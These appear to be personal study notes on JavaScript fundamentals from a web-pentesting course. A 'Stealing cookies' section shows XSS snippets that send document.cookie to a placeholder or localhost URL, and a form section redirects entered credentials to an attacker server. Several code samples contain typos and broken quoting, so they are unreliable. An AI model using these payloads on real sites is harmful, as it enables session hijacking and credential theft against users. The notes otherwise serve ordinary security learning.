
Javascript 
  - Invented at Netscape
  - Provide interactivity with the user  
  - Client Side Scripting language 
  	- runs within browser Sandbox
  - Server Side JS
	- Node.js

Typical Implementation : 

  - Encapsulated within <script> tag
  
Important to know : 
  - JS is Case Sensitive 
  - Browser Executes JS Sequentially as it encounters it 

Variable : 
  -  mozilla addon : firebug 
  - Dynamically Typed Language 
	- no need to declare data types 
  - var a
	- var a = 100 
	- var a = "hello"

Variable Naming : 
	
  - Case Sensitive 
  - must begin with letter or _ and Not by a number 
  - No reserved key word 

Vriables Scope : 
	- Global 
	- Local 
 
--------------------------------------------------------------------------------------------------------


Operators : 

  - Arithematic -> +, -, *, /, ++, --
  - Assignment -> =, +=, -=, *=
  - Comparison -> ==, !=, >, <, >=, <=
  - Logical -> &&, ||, !

--------------------------------------------------------------------------------------------------------


Conditional : 

  - if 
  - else
  - else if 
 
  - switch Case : 
	
	switch(...){
		
		case :  statement;
			break;

	}
--------------------------------------------------------------------------------------------------------


Loops : 

- While Loop : 
	
   while(condition is true){
	
   }	


- For Loop : 
	
  for(intitialization;testcondition;iteration){
	
   }

--------------------------------------------------------------------------------------------------------


Functions : 

  - Block of Code made reuseable 

  function function_name( argument_list ){
  
  }
--------------------------------------------------------------------------------------------------------


Data types : 
  - Numbers 
  - Strings 
  - Array 
  - Objects : 
	Properties - Value/Data

	Methods - Associated Action 
	  e.g. Vulnerability Object 
	    - CVE Number is Property 
     	    - isVulnerable() is a method 
	   
	JS is Prototype Based
	  - no classes like in other Object Oriented Language 

 	Accessing Object Properties & Methods : 
	  - Object_Name.Property_Name
	  - Object_Name.Method_Name(arg)

	example of functions : 

	<script>
	function vulnerable(description, cveid ){
		this.description = description;
		this.cveid = cveid;
		this.alertVulnerability = function(){
			alert(this.desciption + ' : '+ this.cveid );	
		}		
	}
	
	var vun1 = new vulnerable("XSS in PHBB", 12345)
	vuln1.alertVlunerability()

	</script> 
--------------------------------------------------------------------------------------------------------



Enumerating Object Properties : 

Defining Methods in Objects : 
	
	<script>
	function vulnerable(description, cveid ){
		this.description = description;
		this.cveid = cveid;
		this.alertVulnerability = function(){
			alert(this.desciption + ' : '+ this.cveid );	
		}		
	}
	
	var vun1 = new vulnerable("XSS in PHBB", 12345)

	vulnerable.prototype.isVulnerable = function () { 
		alert("XSS")	
	} 

	vuln1.isVulnerable() 

	</script> 

--------------------------------------------------------------------------------------------------------


	
There are three ways to iterate over a Object : 

 1. For..in
	iterates over the enumerable properties of an object, in arbitary order. For each distinct property, statement 
	can be executed
		
 	for( prop in vuln1 ){
		alert(prop + ' : ' + vuln1[prop])

	}


 2. Object.keys()

Summary : The Object.keys() method return a array of a given object's own enumerable properties,in the same order as
	  that provided by a for..in loop 

	: The Object.getOwnPropertyNames() method returns an array of all properties found directly upon a given object 

syntax : Object.keys(obj)  
       : Object.getOwnPropertyNames(obj)  


--------------------------------------------------------------------------------------------------------



HTML DOM : 

  - Document Object Module : 
	It is an API for manipulating HTML and XML documents. It Provide a Structural representation of the Documents 
	, enabling you to modify its content and visualize presentation by using a scripting Language such as Javascript 

Finding and Modifying Elements : 
 
  - Find : 
 	- getElementById()
	- getElementsByTagName()
	
  - Modify : 
	- .innerHTML = ""

 --------------------------------------------------------------------------------------------------------


Event Handler : 

	- Events : click, Mouseover etc
	- Event handler provide a mechanism to react to these events 


	1 . click : 

	<script>
		<h1 id="js" onclick "alert("You have just clicked")"> Welcome to Pentester Academy </h1> 
	</script>

	2 . mouseover : 

	<h1 id="js"  >"Welcome to Javascript" </h1>
	<script>
		document.getElementById("js").onmouseover = function (event) {alert("Event Occured")}

	
	</script>

	3 . addEventListener

	<h1 id="js" > "Welcome to Javascript" </h1>
	<script>
		document.getElementbyId("js").addEventListener('click', function(event) {
			alert("Event occured ");
		},false);
	</script>	

--------------------------------------------------------------------------------------------------------

Cookies :  

  - Set 
  - Modify
  - Delete 


-> To set a cookie :
	<script>
		document.cookie = "sessionid=123456789asdfghjkl;";
		alert(document.cookie);
		
		document.cookie = "userid="1223;";
		alert(document.cookie);

		cookies = document.cookie.split(";");
		for(var i = 0;i<cookies.length();i++){
			alert("cookies[i]")
		}
	
	Note the new cookie will apend to the previous cookie 

	</script>
	Note : We cannot simply run the above script as we have to associate this cookie with some domain 


-> To modify the cookie : 
 	<script>
		document.cookie = "sessionid=123456789asdfghjkl;";
		alert(document.cookie);
		
		document.cookie = "userid="1223;";
		alert(document.cookie);
		
		// TO Modify the cookie just change the value : 
	
		document.cookie = "sessionid=zxcvbnmasdfghjkl;";
		// Now the cookie has been modified 
	

	</script>

-> To remove a cookie : 
	
	Note : to delete the cookie we need to set the expiry date to the past time by doing this it will expire 
	
	document.cookie = "sessionid="sdsdsdsd"; expires=FRI, 24 Jan 2021 00:00:00 GMT;";
		
--------------------------------------------------------------------------------------------------------

Stealing cookies : 

  - document.location 
  - <img src="...."/>
  - <img src="...." height="1" width="1"/>
  - new image().src="...." 

document.location example : 
	
	<script>

		document.cookie = "sessionid=123456789123456789;";
		document.location = "http://[site to redirect]/?" + document.cookie

	</script>

Using an image file : 
	
	where source ar set to the url where you want to post the cookie 

	<script>

		document.cookie = "sessionid=123456789123456789;";
		document.write('<img height="1" width="1" src="http://localhost:8000/?' + document.cookie+ '" / >');
	
	// height = 1 and width = 1 is set because it will remove the broken image tag  
	
	</script>

	
using new image : 

	<script>

		document.cookie = "sessionid=123456789123456789;";
		new Image().src="http://localhost:8000/?" + document.cookie;
	
	</script>

--------------------------------------------------------------------------------------------------------

Exceptions : 

  - Errors Happens 
  - Error need to be handle gracefully 
  - try- catch finally 

	<script>
		
		try {
			DoesNotExists();	
		// to through your custom error message 
		
			throw "This is custom Exception !!"; 		
			
		}	
		catch(err) {
			document.write("Error was : " + err.message);
		}	
		finally {
			document.write("Runs regardless of if error happens or not !! ");
		}	

	</script>


--------------------------------------------------------------------------------------------------------

Advance Form Manipulation : 

Forms : 

  - Intercepting a form submit 
  - Reading / Modifying values in the form 
  - posting form to attacker controlled server 
 
	
	<form id="test" action="/authorize" method="get">
		username: <input type="text" name="username" />
		<br>
		Password: <input type="password" name="pass "/>
		<input type="submit" value="submit" />	
	</form>

	<script>
	
	function InterceptForm()
	{
		alert(document.form["test"]["username"].value)
		alert(document.form[0].elements[1].value)			 	
		
		// Now if we want to redirect this form to our server we can change in action="url"

		document.forms[0].action="http://localhost:8000/" ;
		return true ;
	}

	test.onsubmit = InterceptForm();
	
	</script>


--------------------------------------------------------------------------------------------------------

XMLHttpRequest Basics 

XMLHttpRequest is a Javascript object that was designed by microsoft. It provide an easy way to retrieve
data from a URL without having to do a full page refresh. A web page can update just a part of the web page 
without disrupting what the user is doing XMLHttpRequest is used heavily in AJAX Programming.     

Origin Policies : 

  - Same origin Policy 
	- resource sharing allowed only if from same origin
	- origin based on Protocol, port and host combination 
  - Cross Origin Resources Sharing 
	- server decides based on origin domain 

// script for XHR object  
 
<script>

var req = new XMLHttpRequest();

req.onreadystatechange = function()

{
	if(req.readystate == 4 && req.status == 200){
		response_data = req.responseText;
		alert(response_data);
	}
}

// true for asynchronous

req.open('GET', 'path',true); 
req.send();

</script>

--------------------------------------------------------------------------------------------------------



